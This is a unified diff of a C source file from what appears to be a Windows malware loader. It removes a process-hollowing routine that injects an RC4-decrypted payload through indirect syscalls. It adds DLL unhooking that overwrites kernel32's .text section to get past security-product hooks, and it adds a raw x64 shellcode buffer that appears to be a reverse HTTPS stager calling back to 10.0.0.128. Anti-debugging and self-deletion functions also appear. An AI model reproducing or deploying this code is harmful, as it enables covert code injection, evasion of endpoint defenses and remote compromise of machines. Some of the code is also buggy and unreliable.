@@ -144,151 +144,6 @@ void printByteArray(const unsigned char* array, size_t size) {
     printf("\n", array);
 }
 
-BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
-
-    printf("Size payload: %d\n", sPayload);
-
-
-    //Now that we have the query process ifnormation syscall we can find the entry point of the process handle being passed
-    //to do this we first find the PEB then using offsets calculate the entry point
-
-    //step 1. find the PEB
-    //  _Out_     PVOID            ProcessInformation,
-
-    PROCESS_BASIC_INFORMATION basicInformation = { 0 };
-    printf("PROCESS ID: %d\n\n", Pi.dwProcessId);
-    //ProcessBasicInformaiton is a flag defined in the docs to retreive a pointer to ProcessBasicInformation struct when set to ProcessBasicInformation.
-    //NtQueryProcessInformationPtr myNtQueryProcessInformation1 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
-
-    //myNtQueryProcessInformation1(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
-
-    gCurrentSyscall = VxTable.QueryInfoProcess.wRCXVal;
-    NTSTATUS result = NoahRead3(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
-
-    printf("NTSTATUS????? %d", result);
-    //syscalls.myNtQueryProcessInformation(Pi.hProcess,ProcessBasicInformation)
-    printf("PEB: 0x%p\n", basicInformation.PebBaseAddress);
-
-    //Now with PEB get offsets to image entry point 
-
-    uintptr_t BaseAddress = (uintptr_t)basicInformation.PebBaseAddress + 0x10;//
-    BYTE procAddr[64];
-    BYTE procAddr2[64];
-
-    BYTE dataBuff[0x200];
-    SIZE_T bytesRW = 0;
-    // THis 64 is based on the architecture used...
-
-    //BOOL result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
-    //BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
-    printf("Base Address: 0x%p\n", BaseAddress);
-    //getchar();
-    printf("Starting NoahRead\n");
-    //getchar();
-
-
-    //working - BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
-
-    //BOOL result = NoahRead(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
-    printf("Proc Address (Empty 1): 0x%p\n", procAddr);
-    printf("Proc Address (Empty 2): 0x%p\n", procAddr2);
-
-    // BOOL result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
-
-
-    // printf("RESULTSS????? %d, %d\n", result, bytesRW);
-    getchar();
-    gCurrentSyscall = VxTable.Read.wRCXVal;
-    result = NoahRead3(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
-    getchar();
-    printf("Enging NoahRead\n");
-
-    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
-    printf("Proc Address (Empty 1): 0x%p\n", procAddr);
-    printf("Proc Address (Empty 2): 0x%p\n", procAddr2);
-    printf("&Proc Address (Working): 0x%p\n", *procAddr);
-    printf("&Proc Address (Noah): 0x%p\n", *procAddr2);
-
-    getchar();
-    uintptr_t executableAddress = *((uintptr_t*)procAddr);//
-
-    //result = syscalls.myNtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
-    //result = Sw3NtReadVirtualMemory(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), & bytesRW);
-    gCurrentSyscall = VxTable.Read.wRCXVal; // just for clairty
-    result = NoahRead3(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
-    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
-
-    unsigned int e_lfanew = *((unsigned int*)(dataBuff + 0x3c));
-    unsigned int rvaOffset = e_lfanew + 0x28;
-
-    unsigned int rva = *((unsigned int*)(dataBuff + rvaOffset));
-
-    uintptr_t entrypointAddr = executableAddress + rva;
-    PVOID test = (PVOID)entrypointAddr;
-    ULONG sizer = sPayload;
-    DWORD oldPerm = PAGE_EXECUTE_READWRITE;
-
-    printf("Entrypoint: 0x%lp\n", test);
-    printf("Size payload: %d", sPayload);
-
-    PVOID sizeTest = (PVOID)sPayload;
-
-    //BOOL results = syscalls.myNtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
-    //result = Sw3NtProtectVirtualMemory(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
-    gCurrentSyscall = VxTable.Protect.wRCXVal;
-    printf("gCurrentSyscall: %d\n", gCurrentSyscall);
-    printf("Protect Num: %d\n", VxTable.Protect.wRCXVal);
-    result = NoahRead3(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
-    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, oldPerm);
-
-
-    //    BOOL results = VirtualProtectEx(Pi.hProcess, entrypointAddr, sPayload, PAGE_EXECUTE_READWRITE, &oldPerm);
-    //BOOL results = VirtualProtectEx(Pi.hProcess, entrypointAddr, sPayload, PAGE_EXECUTE_READWRITE, &oldPerm);
-
-    printf("Address of optional header offset: 0x%p\n", e_lfanew);
-    printf("Address of entrypoint rva offset: 0x%p\n", rvaOffset);
-    printf("Executable ADDR: 0x%lp\n", executableAddress);
-    printf("Entrypoint ADDR: 0x%lp\n", test);
-    printf("Entrypoint: 0x%lp\n", entrypointAddr);
-    printf("Change Perms: %X\n", result);
-    getchar();
-
-    printf("\nentrypoint: 0x%p\n", entrypointAddr);
-    printf("pvoid entrypoint pvoid: 0x%p\n", (PVOID)entrypointAddr);
-    printf("(PVOID)Test pvoid: 0x%p\n", (PVOID)test);
-    printf("&Test pvoid : 0x % p\n", &test);
-    printf("Test : 0x%p\n", test);
-
-    getchar();
-    ULONG read = 0;
-
-    //BOOL bruh = syscalls.myNtWriteVirtualMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);
-    Rc4EncryptionViSystemFunc032(Rc4Key, Rc4CipherText, sizeof(Rc4Key), sizeof(Rc4CipherText)); //Allow as little time to analzye payload a spossible, decrypt just before write
-
-    //BOOL bruh = Sw3NtWriteVirtualMemory(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
-    gCurrentSyscall = VxTable.Write.wRCXVal;
-    result = NoahRead3(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
-    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
-
-    // St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)
-    //WriteProcessMemory(Pi.hProcess, test, pPayload, sPayload, &bytesRW);
-
-    //if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
-
-    //results = syscalls.myNtWriteVirtualMemory(Pi.hProcess, (LPVOID)entrypointAddr, truePayload, sizeof(truePayload), &numBytesWritten);
-    //results =  (Pi.hProcess, (LPVOID)test, truePayload, sizeof(truePayload), &bytesRW);
-    printf("WRote @ Address of entrypoint offset: 0x%p\n", test);
-    printByteArray(Rc4CipherText, sizeof(Rc4CipherText));
-    getchar();
-
-    //ResumeThread(Pi.hThread);
-    PULONG suspendCount;
-
-    //Sw3NtResumeThread(Pi.hThread, &suspendCount);
-    gCurrentSyscall = VxTable.ResumeThread.wRCXVal;
-    result = NoahRead3(Pi.hThread, &suspendCount);
-    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, suspendCount);
-}
 
 void detectDebug() {
     // Calling NtQueryInformationProcess with the 'ProcessDebugPort' flag
@@ -346,7 +201,7 @@ BOOL DeletesSelf() {
 
 
 //Also not that this is essentially a custom GetModuleHandle??? 
-void GetBase(IN PPEB pPEB, OUT PVOID* pBaseAddr) {
+void GetBase(IN PPEB pPEB, OUT PVOID* pBaseAddr,wchar_t* DLLPath ) {
     PPEB_LDR_DATA ldr = pPEB->Ldr;
     PLIST_ENTRY listEntry = &ldr->InMemoryOrderModuleList;
     PLIST_ENTRY entry = listEntry->Flink;
@@ -359,9 +214,9 @@ void GetBase(IN PPEB pPEB, OUT PVOID* pBaseAddr) {
             wprintf(L"%ls\n", tableEntry->FullDllName.Buffer);
         }
 
-        if (tableEntry->FullDllName.Buffer && wcscmp(tableEntry->FullDllName.Buffer, L"C:\\Windows\\SYSTEM32\\ntdll.dll") == 0) {
+        if (tableEntry->FullDllName.Buffer && wcscmp(tableEntry->FullDllName.Buffer, DLLPath/*L"C:\\Windows\\SYSTEM32\\ntdll.dll"*/) == 0) {
             
-            printf("Found NTDLL %p\n", tableEntry->DllBase);
+            wprintf(L"Found %s at %p\n", tableEntry->FullDllName.Buffer,tableEntry->DllBase);
             *pBaseAddr = tableEntry->DllBase;
             return; // Successfully found and assigned the base address
         }
@@ -371,9 +226,8 @@ void GetBase(IN PPEB pPEB, OUT PVOID* pBaseAddr) {
     *pBaseAddr = NULL; // No match found, set base address to NULL
 }
 
-uint64_t pTextSection = NULL;
-DWORD sTextSection = 0;
-void GetImageExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
+DWORD blah = 0;
+void GetImageExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory, OUT PVOID* pTextSection, OUT DWORD* sTextSection) {
 
     PIMAGE_DOS_HEADER pImageDOSHeader = (PIMAGE_DOS_HEADER)pModuleBase; //Get a PIMAGE_DOS_HEADER struct from the modyle base 
     //so we get access to NT headers
@@ -387,49 +241,29 @@ void GetImageExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExport
     PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
     *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
 
+     printf("HEREEEE\n");
+    DWORD sHooked = 0;
+    PVOID bruh = NULL;
     for (int i = 0; i < wNumberSection; i++, pImageSectionHeaders++) {
 
         if (strcmp((char*)pImageSectionHeaders[i].Name, ".text") == 0) {
             printf("Section: %s | 0x%p,\n", pImageSectionHeaders[i].Name, pImageSectionHeaders[i].VirtualAddress);
-            pTextSection = (uint64_t)((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress);
-            sTextSection = pImageSectionHeaders[i].Misc.VirtualSize;
-            printf("Text Section NTDLL Pointer: 0x%p\nSize of .text Section: %d\n", pTextSection, sTextSection);
+            bruh = (PVOID)((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress);
+            sHooked = pImageSectionHeaders[i].Misc.VirtualSize;
+            printf("Text Section module Pointer: 0x%p\nSize of .text Section: %d\n", bruh, sHooked);
+            printf("error?");
+
+            *pTextSection = bruh;
+            *sTextSection = sHooked;
+            getchar();
+            printf("error?");
+
+            break;
 
         }
     }
+    printf("End\n");
 
-    DWORD* addressOfFunctions = (DWORD*)((BYTE*)pModuleBase + pImageExportDirectory->AddressOfFunctions);
-    DWORD* addressOfNames = (DWORD*)((BYTE*)pModuleBase + pImageExportDirectory->AddressOfNames);
-    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);
-
-    DWORD byteCounter = 0;
-    WORD counter = 0;
-
-    //this is defffff! the way to go. just loop through all the exported functions - find our sybscall - and move onto the next
-    // - particularly like because we avoind needing to filter out syscall opcodes outside of the systemcalls themselves within ntdll
-    //BOOL go = TRUE;
-    for (int i = 0; i < pImageExportDirectory->NumberOfFunctions; i++) {
-        DWORD dwFunRVA = addressOfFunctions[addressOfNameOrdinals[i]];
-        PBYTE pbFuncAddress = (PBYTE)pModuleBase + dwFunRVA;
-        // go = TRUE;
-         //I do recognize that due to the lack of while loop we are getting "lucky" per say 
-        if (
-            (*(pbFuncAddress + byteCounter) == 0x0f) && (*(pbFuncAddress + byteCounter + 1) == 0x05)
-            ) {
-
-            PBYTE opcode1 = *((PBYTE)pbFuncAddress + byteCounter);
-            PBYTE opcode2 = *((PBYTE)pbFuncAddress + byteCounter + 1);
-            printf("IS THIS WORKING?????? 0x%p : %02X %02X\n", (pbFuncAddress + byteCounter), opcode1, opcode2);
-            pSystemCalls[counter] = (PVOID)((PBYTE)pbFuncAddress + byteCounter);
-            counter++;
-            byteCounter = 0;
-
-        }
-        byteCounter++;
-
-
-    }
-    return TRUE;
     //While we're getting image export directory we can also populate the systemcalls list
 }
 
@@ -609,15 +443,27 @@ EXTERN_C void UpdateGlobals(DWORD input) {
 }
 
 
+typedef NTSTATUS(NTAPI* pNtCreateFile)(
+    PHANDLE FileHandle,
+    ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PIO_STATUS_BLOCK IoStatusBlock,
+    PLARGE_INTEGER AllocationSize,
+    ULONG FileAttributes,
+    ULONG ShareAccess,
+    ULONG CreateDisposition,
+    ULONG CreateOptions,
+    PVOID EaBuffer,
+    ULONG EaLength
+    );
 
-void UnhookDLL(PCWSTR* DLLPath) {
+HANDLE FetchCleanPointer(PCWSTR* DLLPath) {
 
     // Set up necessary structures
     UNICODE_STRING fileName;
     OBJECT_ATTRIBUTES objAttrs;
     IO_STATUS_BLOCK ioStatusBlock;
-    HANDLE hFile;
-
+    HANDLE hFile = NULL;
     //Will setup the unicode string with the path we passed.
     
 
@@ -632,31 +478,155 @@ void UnhookDLL(PCWSTR* DLLPath) {
 }
     */
         
-    InitializeObjectAttributes(&objAttrs, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    printf("Bruh");
+    HMODULE hNtDll = LoadLibraryA("kernel32.dll");
+    if (hNtDll == NULL) {
+        printf("Failed to load ntdll.dll\n");
+        return 1;
+    }
 
-    fileName.Buffer = DLLPath;
-    fileName.Length = wcslen(DLLPath) * sizeof(WCHAR);
-    fileName.MaximumLength = fileName.Length + sizeof(WCHAR);
-    gSSN = VxTable.Create.wSystemCall;
-    //NoahRead3(&hFile, GENERIC_READ, &objAttrs, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);
-        // Call NtCreateFile
-    printf("gSSN set to %d\n", gSSN);
-    NTSTATUS status = NoahRead3(
-        &hFile,
-        FILE_GENERIC_READ,
-        &objAttrs,
-        &ioStatusBlock,
-        NULL,
-        FILE_ATTRIBUTE_NORMAL,
-        FILE_SHARE_READ,
-        FILE_OPEN,
-        FILE_NON_DIRECTORY_FILE,
-        NULL,
-        0
-    );
 
-    printf("NTSTATUS?? %d\n", status);
+    //char* cNtdllPath = "C:\\Windows\\System32\\ntdll.dll";
+    hFile = CreateFileA(DLLPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == NULL) {
+        printf("Cannot get ntdll handle\n");
+    }
+    DWORD dwFileSize = GetFileSize(hFile, NULL);
+    PVOID pNtdllBuffer = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwFileSize);
+
+
+    LPDWORD bytesRead = 0;
+    ReadFile(hFile, &pNtdllBuffer, dwFileSize, &bytesRead , NULL);
+    if (hFile == NULL) {
+        printf("bruhhh");
+    }
+    return hFile;
 }
+
+void UnhookDLL(PVOID pModuleBase,PVOID pClean, HANDLE hCleanDLL) {
+
+//    HANDLE hCleanNTDLL = CreateFileA("C:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+
+//    HANDLE hMap = CreateFileMappingA(hCleanDLL, NULL, PAGE_READONLY|SEC_IMAGE, 0, 0, NULL);
+
+//    LPVOID pCleanNTDLL = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
+
+
+    HANDLE hCleanNTDLL = CreateFileA("c:\\windows\\system32\\kernel32.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    HANDLE hMap = CreateFileMapping(hCleanNTDLL, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+    LPVOID pCleanNTDLL = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
+
+    //now we can access the file as if it were a block of memory.
+    // we only need read because this is our clean version that we will copy into our .text section.
+
+    PIMAGE_DOS_HEADER pImageDOSHeader = (PIMAGE_DOS_HEADER)pModuleBase; //Get a PIMAGE_DOS_HEADER struct from the modyle base 
+    //so we get access to NT headers
+
+    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDOSHeader->e_lfanew);
+
+    //This is to find the beginning of the .text sectoin of NTDLL so we can limit the scope of syscall opcodes to only wihtin their
+    PIMAGE_SECTION_HEADER pImageSectionHeaders = IMAGE_FIRST_SECTION(pImageNtHeaders); // a macro to essentially go from base address of NtHeaders then add offset to optional header, then adding size of optional header to get the first section.
+    WORD wNumberSection = pImageNtHeaders->FileHeader.NumberOfSections;
+    //Now from the NT header we can extract the export address table for all fucntions within the dll
+    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
+
+    PVOID pTextSection = NULL;
+    SIZE_T sTextSection = NULL;
+    for (int i = 0; i < wNumberSection; i++, pImageSectionHeaders++) {
+
+        if (strcmp((char*)pImageSectionHeaders[i].Name, ".text") == 0) {
+            printf("Section: %s | 0x%p | 0x%p \n", pImageSectionHeaders[i].Name, pImageSectionHeaders[i].VirtualAddress, ((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress));
+
+            pTextSection = ((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress);
+
+            sTextSection = pImageSectionHeaders[i].Misc.VirtualSize;
+            printf("Text Section Pointer: 0x%p\nSize of .text Section: %d\n", pTextSection, sTextSection);
+
+            printf("Clean NTDLL: 0x%p\n", pCleanNTDLL);
+
+            printf("About to unhook!\n");
+            getchar();
+            PDWORD pdwOldProt = NULL;
+            VirtualProtect((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress, sTextSection, PAGE_EXECUTE_READWRITE, &pdwOldProt);
+            printf("BEFORE UNHOOKING:\n\n");
+            int offset = 400;
+            int counter = 0;
+            for (int i = 0; i < 10; i++) {
+                for (int j = 0; j < 10; j++) {
+                    printf(" %02X ", *((PBYTE)pTextSection + i + offset));
+                }
+                printf("\n");
+            }
+            memcpy(((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress), ((PBYTE)pCleanNTDLL + 0x1000), sTextSection);
+            VirtualProtect(((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress), pImageSectionHeaders[i].Misc.VirtualSize, pdwOldProt, &pdwOldProt);
+            counter = 0;
+            printf("Memory copied\n\n");
+            for (int i = 0; i < 10; i++) {
+                for (int j = 0; j < 10; j++) {
+                    printf(" %02X ", *((PBYTE)pTextSection + i + offset));
+                }
+                printf("\n");
+            }
+            printf("Unhooked!");
+            getchar();
+
+        }
+    }
+
+
+    //Now with our hooked .text found lets overwrite
+
+}
+unsigned char buf[] =
+"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
+"\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x51\x56\x48\x8b\x52"
+"\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x48\x8b\x72\x50"
+"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
+"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
+"\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x8b\x48\x18\x49\x01"
+"\xd0\x50\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
+"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
+"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
+"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
+"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x48\x01"
+"\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
+"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
+"\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e"
+"\x69\x6e\x65\x74\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c"
+"\x77\x26\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31"
+"\xc0\x4d\x31\xc9\x53\x53\x49\xba\x3a\x56\x79\xa7\x00\x00"
+"\x00\x00\xff\xd5\xe8\x0b\x00\x00\x00\x31\x30\x2e\x30\x2e"
+"\x30\x2e\x31\x32\x38\x00\x5a\x48\x89\xc1\x49\xc7\xc0\xbb"
+"\x01\x00\x00\x4d\x31\xc9\x53\x53\x6a\x03\x53\x49\xba\x57"
+"\x89\x9f\xc6\x00\x00\x00\x00\xff\xd5\xe8\x7e\x00\x00\x00"
+"\x2f\x70\x6f\x72\x69\x51\x77\x45\x44\x6f\x65\x4d\x2d\x6b"
+"\x7a\x2d\x52\x57\x50\x6f\x5f\x72\x51\x2d\x78\x6a\x69\x74"
+"\x73\x42\x4a\x42\x69\x66\x36\x5f\x36\x4e\x32\x51\x38\x6f"
+"\x4a\x42\x39\x66\x75\x75\x75\x4e\x62\x56\x6a\x70\x4c\x6f"
+"\x50\x48\x31\x65\x7a\x53\x6c\x66\x5f\x4d\x50\x48\x72\x47"
+"\x4f\x68\x68\x6c\x55\x39\x39\x4f\x4d\x6f\x6f\x71\x7a\x48"
+"\x6b\x6f\x6e\x78\x48\x50\x4e\x46\x75\x50\x39\x37\x52\x58"
+"\x73\x68\x72\x6b\x6b\x39\x68\x69\x69\x4f\x57\x52\x58\x54"
+"\x68\x74\x34\x74\x72\x52\x7a\x6a\x5a\x75\x71\x53\x76\x00"
+"\x48\x89\xc1\x53\x5a\x41\x58\x4d\x31\xc9\x53\x48\xb8\x00"
+"\x32\xa8\x84\x00\x00\x00\x00\x50\x53\x53\x49\xc7\xc2\xeb"
+"\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1"
+"\x6a\x1f\x5a\x52\x68\x80\x33\x00\x00\x49\x89\xe0\x6a\x04"
+"\x41\x59\x49\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff\xd5"
+"\x4d\x31\xc0\x53\x5a\x48\x89\xf1\x4d\x31\xc9\x4d\x31\xc9"
+"\x53\x53\x49\xc7\xc2\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75"
+"\x1f\x48\xc7\xc1\x88\x13\x00\x00\x49\xba\x44\xf0\x35\xe0"
+"\x00\x00\x00\x00\xff\xd5\x48\xff\xcf\x74\x02\xeb\xaa\xe8"
+"\x55\x00\x00\x00\x53\x59\x6a\x40\x5a\x49\x89\xd1\xc1\xe2"
+"\x10\x49\xc7\xc0\x00\x10\x00\x00\x49\xba\x58\xa4\x53\xe5"
+"\x00\x00\x00\x00\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48"
+"\x89\xf1\x48\x89\xda\x49\xc7\xc0\x00\x20\x00\x00\x49\x89"
+"\xf9\x49\xba\x12\x96\x89\xe2\x00\x00\x00\x00\xff\xd5\x48"
+"\x83\xc4\x20\x85\xc0\x74\xb2\x66\x8b\x07\x48\x01\xc3\x85"
+"\xc0\x75\xd2\x58\xc3\x58\x6a\x00\x59\xbb\xe0\x1d\x2a\x0a"
+"\x41\x89\xda\xff\xd5";
 
 int main() {
 
@@ -681,22 +651,62 @@ int main() {
     //Using TEB we can find PEB
     PPEB pCurrentPEB = pCurrentTeb->ProcessEnvironmentBlock;
     PVOID pNtdllBase = NULL;
+    PVOID pDLLBase = NULL;
     printf("Getting base...\n");
 
 
     //Now with the PEB address we can find the base of NTDLL to assist in finding fuynciton syscall instructions
     //To do this we must navigate through the PEB_LDR_DATA struct which contains all the loaded modules in the process.
-
-    GetBase(pCurrentPEB, &pNtdllBase);
-    printf("NTDLL Base: 0x%p\n", pNtdllBase);
+    getchar();
+    wchar_t* DLLPath = L"C:\\Windows\\System32\\KERNEL32.DLL";
+    GetBase(pCurrentPEB, &pDLLBase,DLLPath);
+    wprintf(L"Returned to main... %s Base: 0x%p\n", DLLPath, pDLLBase);
     getchar();
 
     //Now with the base address of NTDLL we need to get all of the functions within it, the Image Export Directory
     PIMAGE_EXPORT_DIRECTORY ppImageExportDirectory = NULL;
     DWORD dwDLLSize = 0; // expirementally about how many functions to expect :shrug:
-    GetImageExportDir(pNtdllBase, &ppImageExportDirectory);
-    printf("DLL Size (bytes): %d", dwDLLSize);
+    
+    PVOID pTextSection = NULL;
+    DWORD sText = NULL;
+    
+    GetImageExportDir(pDLLBase, &ppImageExportDirectory, &pTextSection, &sText);
+    printf("Main\n");
+    //printf("DLL Size (bytes): %d\n", dwDLLSize);
+    wprintf(L"Return to main... Hooked %s .text section: 0x%p\n", DLLPath,pTextSection); //working
 
+    PCWSTR NtdllPath = L"\\??\\C:\\windows\\system32\\kernel32.dll"; //This should probably be hashed
+    PVOID pCleanPointerNtdll = NULL;
+    HANDLE hFile = NULL;
+    hFile = FetchCleanPointer(NtdllPath, pCleanPointerNtdll);
+    if (hFile == NULL) {
+        printf("main bruhhhhhhh");
+    }
+    printf("About to unhook\n");
+    getchar();
+    UnhookDLL(pDLLBase, pCleanPointerNtdll, hFile);
+    getchar();
+    return 0;
+
+/*
+    SIZE_T sWritten = 0;
+    PDWORD oldProt = 0;
+    PVOID Bruh = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);
+    if (!VirtualProtect(Bruh,sizeof(buf), PAGE_EXECUTE_READWRITE,&oldProt)) {
+        printf("bleh");
+    }
+    memcpy(Bruh, buf, sizeof(buf));
+    LPWORD threadID = 0;
+
+    */
+    //HANDLE hThread = CreateThread(NULL, NULL, Bruh, NULL,NULL, NULL);
+    //if (hThread == NULL) {
+    //    printf("bhalh");
+   // }
+    //WaitForSingleObject(hThread, INFINITE);
+    
+    
+    /*
     VX_TABLE_ENTRY Write = { 0 };
     VX_TABLE_ENTRY Read = { 0 };
     VX_TABLE_ENTRY Allocate = { 0 };
@@ -762,12 +772,6 @@ int main() {
     //Now we just have to call the function using assembly temmplates!
     getchar();
 
-    PCWSTR dllPath = L"\\??\\C:\\windows\\system32\\ntdll.dll"; //This should probably be hashed....
+    */
 
-    UnhookDLL(dllPath);
- 
-
-
-    getchar();
-    return 0;
 }
